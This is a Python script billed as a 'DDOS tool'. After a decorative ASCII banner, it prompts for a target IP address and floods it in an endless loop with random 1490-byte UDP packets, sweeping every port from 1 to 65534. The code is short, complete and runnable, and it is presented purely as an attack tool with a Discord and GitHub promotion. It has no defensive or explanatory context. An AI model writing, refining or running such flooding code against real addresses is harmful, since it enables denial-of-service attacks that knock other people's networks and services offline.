#created by Ludo
from pystyle import Anime, Colorate, Colors, Center, System
import socket
import pyfiglet
import socket
import random

ascii_banner = pyfiglet.figlet_format("DDOS TOOLS BY LUDO")

logo = """                                                       

                                !*%$@&##/////////#&@$%*                                   
                           !*$&/§§§§§§§§§§§§§§§§§§§§§§§/#@%!                              
                           &§§§§§§§§§§/#&@$%**! !!  !!!!*%%%*                             
                           !/§§§§§#@%!         $#/@!                                      
                            */§/%!           %/§§§§§@                                     
                             !//*           &§§§§§§§§#!                                   
                               &§@        !#§§§§§§§§§§/*                                  
                                %//%     */§§§§§§§§§§§§#                                  
                                  $§#%  @§§§§§§§§§§§/@*                                   
                                   §§§//§§§§§§§§§§§/                                      
                                  !§§§§§§§§§§§§§§§§§@                                     
                                  !§§§§§§§§§§§§§§§§§§@                                    
                                   *@#§§§§§§§§§§§§§§§§$                                   
                                       *$§§§§§§§§§§§§§§$                                  
                                        *§§§§§§§§§§§§§§#                                  
                                        #§§§§§§§§§§§§&!                                   
                                       %§§§§§§§§§§§§//$                                   
                                       /§§§§§§§§§§§§&%§#!                                 
                                      %§§§§§§§§§§§§§§!!#§%                                
                                      /§§§§§§§§§§§§§§@  &§@                               
                                     %§§§§§§§§§§§§§§§§!  @§&                              
                                     #§§§§§§§§§§§§§§§§@   $&!                             
                                    %§§§§§§§§§§§§§§§§§§                                   
                                    %@@@@@@@@@@@@@@@@@@!                                  
"""

System.Size(140, 40)
System.Title("Ludo")
System.Clear()
Anime.Fade(Center.Center(logo), Colors.black_to_red, Colorate.Horizontal, interval=0.025, enter=True)
System.Clear()
print("\n"*2)
print(Colorate.Horizontal(Colors.red_to_black, Center.XCenter(logo)))
print("\n"*5)
print(Colorate.Horizontal(Colors.red_to_black, Center.XCenter(ascii_banner)))
print("\n"*2)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

print("Discord : https://discord.gg/WAnFk9838x")
print("Github : https://github.com/OverdoseLudo")
ip = input("IP Target : ")
port = 1

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Packet number {} sent to {} in the port {}".format(sent, ip, port))
     if port == 65534:
       port = 1